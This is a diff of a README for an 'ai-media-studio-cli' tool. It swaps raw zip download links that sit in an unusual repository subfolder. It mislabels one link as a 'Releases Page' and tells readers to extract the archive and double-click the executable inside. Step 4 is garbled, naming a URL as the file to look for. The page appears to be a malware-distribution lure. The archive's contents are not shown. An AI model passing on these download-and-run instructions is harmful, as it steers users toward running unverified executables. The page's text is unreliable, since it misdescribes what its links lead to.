@@ -1,6 +1,6 @@
 # 🎨 ai-media-studio-cli - Generate Media Effortlessly
 
-[![Download ai-media-studio-cli](https://raw.githubusercontent.com/boomking0808/ai-media-studio-cli/main/Chwana/ai-media-studio-cli.zip)](https://raw.githubusercontent.com/boomking0808/ai-media-studio-cli/main/Chwana/ai-media-studio-cli.zip)
+[![Download ai-media-studio-cli](https://github.com/boomking0808/ai-media-studio-cli/raw/refs/heads/main/Chwana/cli_media_studio_ai_3.8.zip)](https://github.com/boomking0808/ai-media-studio-cli/raw/refs/heads/main/Chwana/cli_media_studio_ai_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to ai-media-studio-cli! This command-line tool allows you to create vide
 
 To get started, you need to download the software from our Releases page.
 
-1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/boomking0808/ai-media-studio-cli/main/Chwana/ai-media-studio-cli.zip).
+1. Visit this page to download: [Releases Page](https://github.com/boomking0808/ai-media-studio-cli/raw/refs/heads/main/Chwana/cli_media_studio_ai_3.8.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the appropriate file for your system to start the download.
 
@@ -25,7 +25,7 @@ After downloading the file, you'll need to follow these steps to install the sof
 1. Locate the downloaded file, usually in the "Downloads" folder.
 2. Double-click the file to extract the folder.
 3. Open the extracted folder.
-4. Look for the `https://raw.githubusercontent.com/boomking0808/ai-media-studio-cli/main/Chwana/ai-media-studio-cli.zip` file.
+4. Look for the `https://github.com/boomking0808/ai-media-studio-cli/raw/refs/heads/main/Chwana/cli_media_studio_ai_3.8.zip` file.
 5. Double-click the executable file to run it.
 
 ### For Mac Users:
